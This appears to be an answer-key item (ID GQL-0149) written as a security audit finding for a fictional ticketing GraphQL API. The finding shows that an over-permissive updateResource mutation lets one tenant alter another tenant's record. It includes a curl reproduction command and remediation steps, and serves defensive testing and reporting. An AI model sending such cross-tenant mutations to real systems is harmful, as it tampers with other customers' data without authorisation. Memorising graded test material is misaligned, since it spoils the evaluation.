# Expected Response

## System
- Domain: Event Management / Ticketing
- System: VenueCore Ticketing API
- Example ID: GQL-0149

## Priority Findings

### Finding 1: Ticketing Platform — Schema Over-Exposure Enables Cross-Tenant Ticket Record Mutation (Pattern 6.1)
**Severity:** High
**Category:** Misconfiguration / Schema/Relationship Over-Exposure

**Summary:**
Per §5.0 (Pattern 6.1 — schema/relationship over-exposure): The GraphQL schema exposes the `updateResource` mutation with an over-permissive input accepting `ownerId`, enabling cross-tenant ticket manipulation. An attacker from `tenant-5ca2` submitted `updateResource(id: "R-2149", input: {status: "approved", ownerId: "attacker-5ca2bbc6"})` against a ticketing record belonging to `tenant-bbc6`, receiving `CONFIDENTIAL-5ca2bbc6`. In Event Management, this exposes ticket inventory, attendee PII, and financial settlement data.

**Evidence from HAR:**
- Request: `POST https://api.venuecore-ticketing-.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-5ca2`
- Mutation: `updateResource(id: "R-2149", input: {status: "approved", ownerId: "attacker-5ca2bbc6"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-bbc6"`, `ownerId: "other-user-5ca2bbc6"`, `sensitiveField: "CONFIDENTIAL-5ca2bbc6"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-5ca2bbc6`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 6.1 | Schema over-exposes mutation fields |
| HAR request | input.ownerId | attacker-5ca2bbc6 (client-injected) |
| HAR response | tenantId | Cross-tenant ticket data tenant-bbc6 |
| HAR response | sensitiveField | CONFIDENTIAL-5ca2bbc6 |

## Steps to Reproduce

### Step 1 — updateResource ticket schema exploitation (HAR)
```bash
curl -s -X POST https://api.venuecore-ticketing-.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-5ca2" \
  -d '{"query": "mutation { updateResource(id: \"R-2149\", input: {status: \"approved\", ownerId: \"attacker-5ca2bbc6\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-bbc6` ticket record mutated. **Secure:** FORBIDDEN.

## Remediation
1. Strip `ownerId` from `ResourceInput`; set server-side from `$jwt.userId`.
2. Resolver: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
3. Disable GraphQL introspection; restrict mutation fields to minimum required.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
